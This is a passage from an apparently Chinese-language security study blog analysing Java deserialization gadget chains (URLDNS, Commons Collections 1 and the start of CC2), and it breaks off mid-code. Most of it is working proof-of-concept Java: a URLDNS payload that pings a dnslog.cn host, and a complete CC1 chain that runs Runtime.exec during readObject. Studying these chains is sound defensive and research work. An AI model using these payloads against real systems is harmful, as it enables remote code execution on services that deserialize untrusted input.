<br></code></pre></td></tr></table></figure><p>这里还有一句设置hashCode为-1的值，这是为是什么呢？</p><p>原因是在构造的过程中由于调用了putVal()导致hash已经被执行了一次，所以这里的hashCode就有值了不等于-1，反序列化后也就不会触发handler.hashCode了，由于hashCode为私有变量所以采用反射的方法修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;https://h3lveg.dnslog.cn&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.net.www.protocol.http.Handler());<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(url,<span class="hljs-string">&quot;sss&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> URL.class.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(url,-<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        System.out.println(baos);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905095850587.png" class="" title="image-20220905095850587"><p>测试发现有这么多条记录</p><p>put时有一次，readObject时有一次</p><p>另外两次还不理解，只能后续学习了</p><h2 id="Commons-Collections1"><a href="#Commons-Collections1" class="headerlink" title="Commons Collections1"></a>Commons Collections1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>老规矩从内层看起，可以看到ChainedTransformer内包含两种类ConstantTransformer与InvokerTransformer</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905204705467.png" class="" title="image-20220905204705467"><p>阅读代码得知这个类的transform方法会返回传入的对象</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905205529854.png" class="" title="image-20220905205529854"><p>阅读代码得知这个类的transform方法会返回input的对应方法执行后返回的对象</p><p>知道了上述两类的作用下面往外看</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905210007484.png" class="" title="image-20220905210007484"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905210118512.png" class="" title="image-20220905210118512"><p>显然这段逻辑是说将数组里面transformer从头到尾执行transform并将前一个返回的值作为后一个transform的输入</p><p>验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1pa</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        transformer.transform(<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905212357537.png" class="" title="image-20220905212357537"><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906094446102.png" class="" title="image-20220906094446102"><p>可以看到LazyMap的get方法调用了transfrom方法</p><p>只需要factory&#x3D;传入构造好的chainedtransform就可以了</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906094749928.png" class="" title="image-20220906094749928"><p>由于构造方法protected所以需要用decorate</p><p>在上面代码的基础上，修改一下，检验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1pa</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//        transformer.transform(null);</span><br><span class="hljs-comment">//        pb第二部分新增</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(inner,transformer);<br>        <span class="hljs-comment">//此时调用，lazymap不包含key=“sovo”，相当于transformer.trasform(&quot;sovo&quot;)</span><br>        lazymap.get(<span class="hljs-string">&quot;sovo&quot;</span>);<br>        <span class="hljs-comment">//get之后包含了</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906095533948.png" class="" title="image-20220906095533948"><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906140411743.png" class="" title="image-20220906140411743"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906140519234.png" class="" title="image-20220906140519234"><p>memberValues赋值为lazymap</p><p>var4&#x3D;var2.getName</p><p>构造AnnotationInvocationHandler，因为AnnotationInvocationHandler的构造方法没有写限定符(public)默认为default，只能同个包内访问，所以需要利用反射获取构造方法。</p><p>而且需要动态代理调用invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1pa</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//        transformer.transform(null);</span><br><span class="hljs-comment">//        pb第二部分新增</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(inner,transformer);<br>        <span class="hljs-comment">//此时调用，lazymap不包含key=“sovo”，相当于transform.trasform(&quot;sovo&quot;)</span><br><span class="hljs-comment">//        lazymap.get(&quot;sovo&quot;);</span><br>        <span class="hljs-comment">//get之后包含了</span><br><span class="hljs-comment">//        pc第三部分新增</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazymap);<br><br><span class="hljs-comment">//        动态代理调用invoke,此处动态代理创建实现Map接口的类，调用proxyMap的clear方法传入invocationHandler执行invoke</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);<br><span class="hljs-comment">//        proxyMap.clear();</span><br><span class="hljs-comment">//        代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是</span><br><span class="hljs-comment">//        sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用</span><br><span class="hljs-comment">//        AnnotationInvocationHandler对这个proxyMap进行包裹：</span><br>        invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(invocationHandler);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913080019921.png" class="" title="image-20220913080019921"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220906182124489.png" class="" title="image-20220906182124489"><p>Java 8u71以后不能用了，原因在于Annotationhandler#readObject逻辑改变</p><h2 id="Commons-Collections2"><a href="#Commons-Collections2" class="headerlink" title="Commons Collections2"></a>Commons Collections2</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>   Gadget chain:<br>      ObjectInputStream.readObject()<br>         PriorityQueue.readObject()<br>            ...<br>               TransformingComparator<span class="hljs-built_in">.compare</span>()<br>                  InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>                     Method.invoke()<br>                        Runtime.exec()<br> */<br></code></pre></td></tr></table></figure><p>经过前面反序列化的学习我们知道了invokerTransformer.transform能执行命令</p><p>我们直接去看TransformingComparator.compare()</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220911151602019.png" class="" title="image-20220911151602019"><p>构造方法为</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220911151813049.png" class="" title="image-20220911151813049"><p>传入第二个构造方法</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220911151951653.png" class="" title="image-20220911151951653"><p>这里存在一个误区，cc2链使用的包不再是低版本的了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br></code></pre></td></tr></table></figure><p>但是cc2链依旧可以分析</p><p>现在，我们已经知道了compare方法可以调用transforme方法，那么下面我们就要找能调用compare方法的类的readObject，显然这个类就是PriorityQueue</p><p>我们去看一下代码。</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220911202146404.png" class="" title="image-20220911202146404"><p>跟进heapify()方法</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        <span class="hljs-built_in">siftDown</span>(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里for中的条件说明size要&gt;&#x3D;2才能进入循环，调用siftDown</p><p>跟进siftDown</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void sift<span class="hljs-constructor">Down(<span class="hljs-params">int</span> <span class="hljs-params">k</span>, E <span class="hljs-params">x</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != null)<br>        sift<span class="hljs-constructor">DownUsingComparator(<span class="hljs-params">k</span>, <span class="hljs-params">x</span>)</span>;<br>    <span class="hljs-keyword">else</span><br>        sift<span class="hljs-constructor">DownComparable(<span class="hljs-params">k</span>, <span class="hljs-params">x</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进siftDownUsingComparator</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-type">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-type">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.<span class="hljs-built_in">compare</span>((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.<span class="hljs-built_in">compare</span>(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到这里存在comparator.cmpare，且全部的方法调用均是PriorityQueue内部方法，也就是说我们只需要构造一个PriorityQueue类的实例满足条件就行了</p><p>下面构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 